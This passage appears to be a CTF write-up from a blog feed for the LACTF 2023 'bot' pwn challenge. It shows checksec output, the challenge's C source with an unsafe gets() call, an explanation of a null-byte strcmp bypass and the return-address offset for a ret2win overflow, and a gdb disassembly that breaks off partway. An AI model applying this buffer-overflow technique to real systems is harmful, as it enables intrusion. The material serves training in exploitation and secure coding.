&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Partial&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;canary&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;found&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;0x3ff000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;RUNPATH&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;bot_patched&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;ELF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;64-bit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;LSB&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;executable&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;x86-64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;SYSV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;dynamically&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;linked&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;interpreter&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;./&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;ld-2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;31&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;so&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;GNU&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;Linux&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;3&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;BuildID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;sha1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;1ed799aea3b8082b9dadde68dd67684e6101badc&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;debug_info&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;stripped&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, we&amp;rsquo;re going to work on a 64 bits non-stripped dynamically linked executable, with &lt;code&gt;NX&lt;/code&gt; enabled, but it&amp;rsquo;s not a problem for us since we&amp;rsquo;re not going to use a shellcode.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Second <code>pwn</code> challenge from the <code>LACTF 2023</code>. Basic <code>ret2win</code> with a little twist: bypassing a condition to prevent the program from exiting&hellip;</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>I made a bot to automatically answer all of your questions.
</span></span></code></pre></div><p><a href="https://lactf-challs.storage.googleapis.com/uploads/71a24c7af5b65f1b28fbc60904e82f6a59beac87d2fa349fcd5284105a558cf2/Dockerfile"><code>Dockerfile</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/263e55f639b540a00fc87e7fdc10078c1cbe89e148ea440ad1a9cef1cbd53c6f/libc-2.31.so"><code>libc-2.31.so</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/4325e436d7b281490848dfb580f16844adcf31afedf3972e12a660abe5c057c2/ld-2.31.so"><code>ld-2.31.so</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/cae1f131aabcdf137b27331c5193d8f32d028b05668a57a1df239222e3eeff99/bot.c"><code>bot.c</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/006a2e73644835158dc097d4eff75ab978a20ffe92c1ce4f534536c41080a7ea/bot"><code>bot</code></a></p>
<h2 id="file-information">File information</h2>
<p><em>before doing all of that, we run <code>pwninit</code> to patch the binary with the given <code>libc</code> and <code>ld</code></em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">bot_patched</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">file</span> <span style="color:#f92672">bot_patched</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ctfs/lactf2023/bot/bot_patched&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x3ff000</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RUNPATH</span><span style="color:#f92672">:</span>  <span style="color:#e6db74">&#39;.&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">bot_patched</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">./</span><span style="color:#f92672">ld-2</span>.<span style="color:#a6e22e">31</span>.<span style="color:#a6e22e">so</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">1ed799aea3b8082b9dadde68dd67684e6101badc</span><span style="color:#f92672">,</span> <span style="color:#f92672">with</span> <span style="color:#f92672">debug_info</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>So, we&rsquo;re going to work on a 64 bits non-stripped dynamically linked executable, with <code>NX</code> enabled, but it&rsquo;s not a problem for us since we&rsquo;re not going to use a shellcode.</p>
<p>For the source code, there is no need to decompile the file or to struggle with some pseudo-code because we have the <code>.c</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">64</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> give_flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;hi, how can i help?&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(input);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;give me the flag&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;lol no&#34;</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;please give me the flag&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;no&#34;</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;help, i have no idea how to solve this&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;L&#34;</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;may i have the flag?&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;not with that attitude&#34;</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;please please please give me the flag&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;i&#39;ll consider it&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">15</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (give_flag) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;ok here&#39;s your flag&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat flag.txt&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;no&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;sorry, i didn&#39;t understand your question&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
<p>Looking at the <code>C</code> code, we see that the program creates a buffer of <code>64 bytes</code> for our input, they reads with <code>gets()</code>. As a reminder, <strong>this function is dangerous and should never be used</strong> because it doesn&rsquo;t allow you to check the length of the user input.</p>
<p>We have our entry point, but we have one last problem: If none of the comparaisons under the <code>gets()</code> is <code>true</code>, the program will exit and never <code>return</code>, so overwriting <code>rip</code> is useless because it will never jump back to it.</p>
<p>So we will enter &ldquo;<em>give me the flag</em>&rdquo; followed by a <code>null byte</code> and our payload. The <code>null byte</code> will stop the string and allow us to bypass the <code>strcmp</code>.</p>
<p>We now have two things to do: finding out the <code>offset</code> to overwrite <code>rip</code>&rsquo;s save, and finding out where we want to jump to print the flag.</p>
<p>To find out the offset, we can just take a look at the code again:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">64</span>];
</span></span></code></pre></div><p>This is the first variable initialised in the program so it will be the closest from <code>rbp</code> (and thus from <code>rip</code> since <code>rbp</code> is just before). It is <code>64 bytes</code> long so the 65th byte of our input should end up in <code>rbp</code>, and the 73rd (<code>64+8+1</code>) byte should end up in <code>rip</code>. Now, remember that we are not only sending junk, so we have to substract the length of the sentence to this offset.</p>
<p>Then knowing where to jump is just as easy. We&rsquo;re going to use <code>gdb</code> to disassemble the main function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401182</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401183</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401186</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: sub    rsp,<span style="color:#ae81ff">0x50</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040118a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2ecf</span>]        <span style="color:#75715e"># 0x404060 &lt;stdout@GLIBC_2.2.5&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401191</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;</span>:  mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401196</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401199</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x401040</span> <span style="color:#f92672">&lt;</span>setbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040119e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:  mov    DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x44</span>],<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011a5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">35</span><span style="color:#f92672">&gt;</span>:  lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe5c</span>]        <span style="color:#75715e"># 0x402008</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011ac</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">42</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">47</span><span style="color:#f92672">&gt;</span>:  lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011b5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">51</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011b8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x401070</span> <span style="color:#f92672">&lt;</span>gets<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011bd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011c1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">63</span><span style="color:#f92672">&gt;</span>:  lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe54</span>]        <span style="color:#75715e"># 0x40201c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011c8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">70</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011cb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x401060</span> <span style="color:#f92672">&lt;</span>strcmp<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011d0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">78</span><span style="color:#f92672">&gt;</span>:  test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011d2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:  jne    <span style="color:#ae81ff">0x4011e5</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">99</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011d4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:  lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe52</span>]        <span style="color:#75715e"># 0x40202d</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011db</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011e0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">94</span><span style="color:#f92672">&gt;</span>:  jmp    <span style="color:#ae81ff">0x4012cc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011e5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">99</span><span style="color:#f92672">&gt;</span>:  lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011e9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">103</span><span style="color:#f92672">&gt;</span>: lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe44</span>]        <span style="color:#75715e"># 0x402034</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011f0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">110</span><span style="color:#f92672">&gt;</span>: mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011f3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">113</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401060</span> <span style="color:#f92672">&lt;</span>strcmp<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011f8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">118</span><span style="color:#f92672">&gt;</span>: test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011fa</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">120</span><span style="color:#f92672">&gt;</span>: jne    <span style="color:#ae81ff">0x40120d</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">139</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011fc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">122</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe49</span>]        <span style="color:#75715e"># 0x40204c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401203</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">129</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401208</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">134</span><span style="color:#f92672">&gt;</span>: jmp    <span style="color:#ae81ff">0x4012cc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040120d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">139</span><span style="color:#f92672">&gt;</span>: lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401211</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">143</span><span style="color:#f92672">&gt;</span>: lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe38</span>]        <span style="color:#75715e"># 0x402050</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401218</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">150</span><span style="color:#f92672">&gt;</span>: mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040121b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">153</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401060</span> <span style="color:#f92672">&lt;</span>strcmp<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401220</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">158</span><span style="color:#f92672">&gt;</span>: test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401222</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">160</span><span style="color:#f92672">&gt;</span>: jne    <span style="color:#ae81ff">0x401235</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">179</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401224</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">162</span><span style="color:#f92672">&gt;</span>: lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe4c</span>]        <span style="color:#75715e"># 0x402077</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040122b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">169</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401230</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">174</span><span style="color:#f92672">&gt;</span>: jmp    <span style="color:#ae81ff">0x4012cc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">330</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401235</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">179</span><span style="color:#f92672">&gt;</span>: lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
